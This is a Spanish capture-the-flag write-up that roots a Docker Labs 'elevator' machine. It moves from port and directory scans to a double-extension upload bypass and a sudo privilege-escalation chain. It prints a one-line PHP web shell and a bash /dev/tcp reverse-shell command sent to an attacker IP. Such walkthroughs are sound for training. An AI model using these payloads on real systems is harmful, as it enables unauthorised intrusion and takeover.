Primero verificamos si tenemos **ping** de la máquina de **Docker Labs**.
![[Pasted image 20241219231059.png]]

Iniciamos la fase de reconocimiento de los puertos de dicha máquina con **NMAP**.
```bash
nmap -p- -sT -sV -A $IP -oN elevator
```
![[Pasted image 20241219231223.png]]
	Al parecer, solamente tenemos el puerto 80 habilitado. Vamos a proceder a analizar dicha web.

Al parecer, es una simple web que, al presionar el botón **¡Abre el Ascensor!**, muestra una animación y un mensaje que aparece en la pantalla.
![[Pasted image 20241219231519.png]]
![[Pasted image 20241219231616.png]]

Siguiendo con la etapa de reconocimiento, vamos a usar **Gobuster** para el reconocimiento de directorios de dicha web.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 403,404 -x php,txt,php.bak,bak,tar
```
![[Pasted image 20241219232423.png]]

También procedemos a realizar el reconocimiento de directorios con **Feroxbuster**.
```bash
feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -d 10 -t 200 -x php,txt,html,php.bak,bak,tar --status-codes 200
```
![[Pasted image 20241219232642.png]]

Con **Feroxbuster** encontramos 2 ficheros con extensión **PHP** y **HTML**, los cuales vamos a analizar para proceder a su explotación.

En la ruta `http://172.17.0.2/themes/upload.php` encontramos un fichero que la web está interpretando, pero no visualizamos nada.
![[Pasted image 20241219232934.png]]

En la siguiente ruta `http://172.17.0.2/themes/archivo.html` encontramos un apartado donde podemos subir imágenes con extensión JPG.
![[Pasted image 20241219233219.png]]

Vamos a proceder primero a crear un fichero con la extensión `.php`, por si la web permite subir dicho fichero. Si es así, podemos aprovechar esta vulnerabilidad para ganar acceso a la máquina.
```php
<?php
    system($_GET['cmd'])
?>
```
![[Pasted image 20241219233937.png]]

Procedemos a subir el fichero a la web.
![[Pasted image 20241219234236.png]]

Pero al subir nuestro fichero **PHP**, la web no lo permite; solo nos permite subir ficheros con extensión **JPG**.
![[Pasted image 20241219234309.png]]

Vamos a realizar el método de doble **"double extension attack"**. Este ataque aprovecha las configuraciones de seguridad de los servidores web que pueden estar configurados para permitir la carga de archivos con ciertas extensiones, como `.jpg`, pero no de otras, como `.php`. 

En este ataque, renombramos el archivo para que tenga una extensión doble, como `reverShell.php.jpg`, lo que engaña al servidor para que lo permita cargar, mientras que el archivo PHP podría ejecutarse al acceder a él.
![[Pasted image 20241219234912.png]]

Nuevamente probaremos subir el fichero con la extensión doble a la web y verificaremos si nos lo permite.
![[Pasted image 20241219235244.png]]

**¡Bingo!** Logramos subir nuestro archivo y la web nos proporciona la ruta donde se encuentra ubicado. Procederemos a visualizarlo para comprobar si la web lo interpreta o no.
![[Pasted image 20241219235305.png]]

La web interpreta correctamente el archivo malicioso subido por nosotros. 
![[Pasted image 20241219235544.png]]

Al ejecutar el comando `id`, verificamos la respuesta del comando.
![[Pasted image 20241219235918.png]]

Ahora vamos a proceder a hacernos una revershell de la siguiente forma

[ * ] Web victima:
`172.17.0.2/themes/uploads/6764f820a0d32.jpg/?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.19/443 0>%261"`
![[Pasted image 20241220000212.png]]

[ * ]  Shell Atacante
```bash
nc -nlvp 443
```
![[Pasted image 20241220000340.png]]

¡Bummmmm! Estamos dentro de la máquina, pero como el usuario `www-data`. Vamos a verificar los permisos SUID para verificar si podemos elevar los privilegios por este método.
![[Pasted image 20241220000407.png]]

Procederemos a realizar el tratamiento de la TTY para establecer una sesión interactiva más estable.
![[Pasted image 20241220001325.png]]
![[Pasted image 20241220001400.png]]

Lamentablemente no podemos tirar por esta lado.
![[Pasted image 20241220000754.png]]

Vamos a listar los comandos que el usuario puede ejecutar con privilegios de `root` usando `sudo -l`.
![[Pasted image 20241220001555.png]]
	En este caso, no podemos migrar como root, pero sí podemos migrar como el usuario **daphne**, con el cual podemos usar el comando `env`.

Con **GTFOBins**, vamos a buscar el binario `env` y listar los comandos que el usuario puede ejecutar como **daphne**
![[Pasted image 20241220002112.png]]

Ya estando como el usuario **daphne**, procederemos a listar nuevamente los comandos disponibles para verificar si podemos migrar a otro usuario o escalar privilegios.

Al listar nuevamente, verificamos que podemos migrar al usuario **vilma** usando el comando `ash`.
![[Pasted image 20241220002809.png]]

En **GTFOBins** nos indica cómo migrar, lo cual haremos con una pequeña modificación utilizando el parámetro `-u`, donde indicamos el nombre del usuario al cual vamos a migrar (en este caso, **vilma**).
![[Pasted image 20241220002918.png]]
![[Pasted image 20241220002944.png]]

Al parecer, la temática es de esta forma. Vamos a listar nuevamente los comandos o posibles configuraciones disponibles para verificar si podemos continuar con la migración

En este caso, podemos migrar al usuario **shaggy** usando el binario de **ruby**. Nos ayudaremos de **GTFOBins**.
![[Pasted image 20241220003323.png]]
![[Pasted image 20241220003313.png]]

Ganamos acceso al usuario shaggy.
![[Pasted image 20241220003759.png]]

Nuevamente, tenemos el binario **lua** para migrar como el usuario **fred**.
![[Pasted image 20241220004023.png]]
![[Pasted image 20241220004133.png]]

Ahora logramos migrar al usuario **fred**.
![[Pasted image 20241220004214.png]]

Para migrar al usuario **scooby**, tenemos que usar el binario **gcc**.
![[Pasted image 20241220004307.png]]
![[Pasted image 20241220004404.png]]

Logramos migrar al usuario **scooby**. Ahora, vamos a proceder nuevamente a listar.
![[Pasted image 20241220004454.png]]

Finalmente, podemos migrar al usuario **root** utilizando el binario **sudo**.
![[Pasted image 20241220004622.png]]

# $BLING $BLING SOMOS ~~ROOT~~
![[Pasted image 20241220004749.png]]

